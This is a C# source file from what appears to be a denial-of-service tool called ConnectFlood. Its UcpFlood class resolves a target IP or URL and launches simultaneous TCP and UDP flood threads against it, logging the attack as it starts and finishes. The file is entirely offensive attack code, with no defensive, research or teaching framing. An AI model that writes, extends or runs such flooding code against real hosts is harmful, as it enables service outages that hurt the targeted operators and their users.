using System;
using System.Net;
using System.Threading;

namespace ConnectFlood
{
    public class UcpFlood : IAttack
    {
        public void StartFlood(string target, int packetCount, int speed, string none)
        {
            string ip;
            int port;

            try
            {
                if (target.StartsWith("http://") || target.StartsWith("https://"))
                {
                    Uri uri = new Uri(target);
                    ip = Dns.GetHostAddresses(uri.Host)[0].ToString();
                    port = uri.Port > 0 ? uri.Port : (uri.Scheme == "https" ? 443 : 80);
                }
                else
                {
                    string[] targetParts = target.Split(':');
                    if (targetParts.Length != 2 || !int.TryParse(targetParts[1], out port))
                    {
                        Console.WriteLine("Invalid target format. Use: IP:PORT or http://domain.com");
                        return;
                    }
                    ip = targetParts[0];
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error parsing target: {ex.Message}");
                return;
            }

            Console.WriteLine($"[UCP] Attacking {ip}:{port} using both TCP & UDP");

            Thread tcpThread = new Thread(() =>
            {
                new TcpFlood().StartFlood($"{ip}:{port}", packetCount, speed ,none);
            });

            Thread udpThread = new Thread(() =>
            {
                new UdpFlood().StartFlood($"{ip}:{port}", packetCount, speed, none);
            });
            tcpThread.Start();
            udpThread.Start();
            tcpThread.Join();
            udpThread.Join();
            Console.WriteLine("[UCP] Attack Finished.");
        }
    }
}
